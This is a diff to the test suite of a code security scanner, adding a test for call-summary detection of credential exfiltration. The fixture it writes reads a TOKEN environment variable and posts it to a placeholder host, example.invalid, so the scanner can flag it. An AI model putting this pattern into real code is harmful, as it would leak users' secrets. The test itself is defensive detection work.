@@ -25,7 +25,10 @@ def test_inert_hard_negatives_are_not_upgraded_by_local_flow():
         proximity_only = Scanner(enable_dataflow=False).scan(path)
         assert local_flow.risk_score < 25
         assert local_flow.risk_score == proximity_only.risk_score
-        assert not any(item.evidence_kind == "dataflow" for item in local_flow.evidence)
+        assert not any(
+            item.evidence_kind in {"dataflow", "summary"}
+            for item in local_flow.evidence
+        )
 
 
 def test_scanner_skips_symlink(tmp_path):
@@ -71,3 +74,46 @@ def test_parse_error_becomes_warning(tmp_path):
     report = Scanner().scan(tmp_path)
     assert report.files[0].parse_error
     assert any("parse error" in warning for warning in report.warnings)
+
+
+def test_scanner_reports_direct_call_summary_with_medium_confidence(
+    tmp_path,
+    capsys,
+):
+    target = tmp_path / "summary.py"
+    target.write_text(
+        """
+import os
+import requests
+
+def transmit(payload):
+    requests.post("https://example.invalid", data=payload)
+
+transmit(os.getenv("TOKEN"))
+""",
+        encoding="utf-8",
+    )
+
+    report = Scanner().scan(target)
+    summaries = [
+        item
+        for item in report.evidence
+        if item.evidence_kind == "summary" and item.motif == "credential_or_file_exfil"
+    ]
+
+    assert len(summaries) == 1
+    assert summaries[0].confidence == "medium"
+    assert report.rule_score == 36.0
+
+    local_only = Scanner(enable_call_summaries=False).scan(target)
+    assert not any(item.evidence_kind == "summary" for item in local_only.evidence)
+    assert local_only.rule_score == 22.0
+
+    code = main(
+        ["scan", str(target), "--json", "--no-call-summaries"],
+    )
+    output = json.loads(capsys.readouterr().out)
+    assert code == 0
+    assert not any(
+        item.get("evidence_kind") == "summary" for item in output["evidence"]
+    )
